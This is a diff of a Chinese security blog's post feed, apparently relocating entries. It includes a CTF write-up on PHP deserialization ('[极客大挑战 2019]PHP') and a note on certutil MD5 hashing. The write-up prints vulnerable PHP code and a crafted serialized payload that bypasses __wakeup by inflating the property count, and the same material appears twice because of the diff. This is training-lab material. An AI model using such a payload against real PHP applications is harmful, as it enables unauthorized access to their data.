+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __construct($username,$password)&#123;</span><br><span class="line">​        $this-&gt;username = $username;</span><br><span class="line">​        $this-&gt;password = $password;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(&#x27;admin&#x27;, 100);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671590041461-ed36aa06-0dc6-43e9-9d6e-156fa697e250.png" alt="img"></p>
+<p>另外，<strong>private 声明的字段在序列化时，需要注意</strong>：</p>
+<ul>
+<li>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</li>
+<li>因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下</li>
+</ul>
+<p>O:4:”User”:2:{s:9:”%00User%00age”;i:20;s:10:”%00User%00name”;s:4:”daye”;}   # 9=7+2  10=8+2  其中2为两个前缀</p>
+<p>(2)也可以直接构造</p>
+<blockquote>
+<?php
+class Name{
+private $username = 'admin';
+private $password = '100';#这里也可以换成数字100
+}
+$name = new Name;
+print(serialize($name));
+?>
+</blockquote>
+<p>最后序列化结果为</p>
+<blockquote>
+<p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
+</blockquote>
+<p>其中的3是为了绕过_wakeup()魔法函数将2改成了3</p>
+<p>最后payload</p>
+<p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
+<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671590395019-d117697c-b848-41ab-b430-c4fdaf8514d8.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(.user.ini+GIF89a+script一句话木马)[SUCTF 2019]CheckIn</title>
     <url>/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/</url>
     <content><![CDATA[<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711680046-9b221109-2797-4f54-b053-1be9a4ffe473.png" alt="img"></p>
@@ -1164,70 +1228,6 @@ https://blog.csdn.net/weixin_39190897/article/details/86772765
 https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       <categories>
         <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(private私有反序列化)[极客大挑战 2019]PHP</title>
-    <url>/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589654129-abe73843-e387-480b-9967-47bf36e15a3e.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589674756-71cd31d2-7107-41cd-9bc5-782ddf90624c.png" alt="img"></p>
-<p>给了提示：备份网站</p>
-<p>扫目录得到<a href="http://www.zip/">www.zip</a></p>
-<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589710907-75674e7f-d840-4b39-b723-ac0b98ee7e17.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __construct($username,$password)&#123;</span><br><span class="line">​        $this-&gt;username = $username;</span><br><span class="line">​        $this-&gt;password = $password;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __wakeup()&#123;</span><br><span class="line">​        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __destruct()&#123;</span><br><span class="line">​        if ($this-&gt;password != 100) &#123;</span><br><span class="line">​            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">​            echo &quot;You name is: &quot;;</span><br><span class="line">​            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​            echo &quot;You password is: &quot;;</span><br><span class="line">​            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​            die();</span><br><span class="line">​        &#125;</span><br><span class="line">​        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">​            global $flag;</span><br><span class="line">​            echo $flag;</span><br><span class="line">​        &#125;else&#123;</span><br><span class="line">​            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">​            die();</span><br><span class="line"></span><br><span class="line">​            </span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面三个php文件，其中flag.php没有用，纯粹迷惑你。</p>
-<p>看index.php中间的几行代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line"></span><br><span class="line">​    include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line">​    $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line">​    $res=unserialize(@$select);</span><br><span class="line"></span><br><span class="line">​    ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里是包含了class.php，并且get传参select，将传入的内容反序列化</p>
-<p>所以我们要将闯入的内容序列化</p>
-<p>看class.php</p>
-<p>在这段代码的__destruct()方法中，发现了输出flag的代码，并且，<strong>执行条件是password==100，username===‘admin’</strong>。</p>
-<p>接下来，就有考虑如何调用__destruct()方法了，这就用到了index.php中的<strong>反序列操作</strong>。</p>
-<p>可以将序列化的Name对象作为select参数的值提交。当执行反序列化之后，又恢复成Name对象，并且，在Name对象销毁时，会自动调用__destruct()方法。</p>
-<p>当时这里用个问题，就是在执行__destruct()方法之前，可能会先执行wakeup()方法，并且在**wakeup()**<strong>会修改username的值</strong>。</p>
-<p>因此，这里<strong>应该绕过wakeup()方法</strong>，避免wakeup()执行。</p>
-<p>这里存在一个<strong>CVE漏洞</strong>：<strong>当成员属性数目大于实际数目时可绕过wakeup方法</strong></p>
-<p>（1）通过php脚本，将serialize($a)函数序列化的结果输出。<strong>脚本生成php序列化对象参考代码如下：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __construct($username,$password)&#123;</span><br><span class="line">​        $this-&gt;username = $username;</span><br><span class="line">​        $this-&gt;password = $password;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(&#x27;admin&#x27;, 100);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671590041461-ed36aa06-0dc6-43e9-9d6e-156fa697e250.png" alt="img"></p>
-<p>另外，<strong>private 声明的字段在序列化时，需要注意</strong>：</p>
-<ul>
-<li>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</li>
-<li>因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下</li>
-</ul>
-<p>O:4:”User”:2:{s:9:”%00User%00age”;i:20;s:10:”%00User%00name”;s:4:”daye”;}   # 9=7+2  10=8+2  其中2为两个前缀</p>
-<p>(2)也可以直接构造</p>
-<blockquote>
-<?php
-class Name{
-private $username = 'admin';
-private $password = '100';#这里也可以换成数字100
-}
-$name = new Name;
-print(serialize($name));
-?>
-</blockquote>
-<p>最后序列化结果为</p>
-<blockquote>
-<p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
-</blockquote>
-<p>其中的3是为了绕过_wakeup()魔法函数将2改成了3</p>
-<p>最后payload</p>
-<p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
-<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671590395019-d117697c-b848-41ab-b430-c4fdaf8514d8.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -2139,29 +2139,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>网安基础总结三</title>
-    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
-<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
-<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
-<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
-<span id="more"></span>
-
-<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
-<p>然后输入命令</p>
-<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
-<p>如</p>
-<p>certutil -hashfile  webpro.war MD5</p>
-<p>注意后面有个MD5,不然会生成一个其他的值。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安基础总结二</title>
     <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
     <content><![CDATA[<p><strong>本周重点</strong></p>
@@ -2285,6 +2262,29 @@ include('files/'.$action.'.php'); //载入相应文件
 <ul>
 <li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
 </ul>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结三</title>
+    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
+<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
+<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
+<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
+<span id="more"></span>
+
+<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
+<p>然后输入命令</p>
+<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
+<p>如</p>
+<p>certutil -hashfile  webpro.war MD5</p>
+<p>注意后面有个MD5,不然会生成一个其他的值。</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
